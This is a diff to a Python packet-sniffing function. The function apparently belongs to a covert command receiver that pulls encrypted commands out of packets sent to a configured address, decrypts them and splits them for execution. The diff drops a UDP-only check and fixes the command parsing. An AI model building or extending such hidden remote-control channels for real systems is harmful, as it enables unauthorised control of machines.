@@ -225,15 +225,9 @@ def process_sniff_pkt(pkt):
     packet_start = "$$!!"
 
     ip_dst = pkt.payload.dst
-    ip_proto = pkt.payload.proto
 
     if ip_dst != config.receiver_address:
         return
-    print(f"proto = {ip_proto}")
-    if ip_proto != 'udp':
-        print(f"Incorrect Proto!")
-        return
-    print(f"Correct Proto!")
 
     # dst_port = pkt.payload.payload.dport
     check_data = bytes(pkt.payload.payload.payload)
@@ -260,7 +254,7 @@ def process_sniff_pkt(pkt):
         print(f"Encrypted Cmd: {s_data}")
         decrypt_cmd = encryption.decrypt(s_data.encode('utf-8')).decode('utf-8')
         print(f"Cmd: {decrypt_cmd}")
-        commands = s_data.split(config.delimiter)
+        commands = decrypt_cmd.split(config.delimiter)
     except:
         print(f"Decryption Failed:\n{decrypt_cmd}")
 
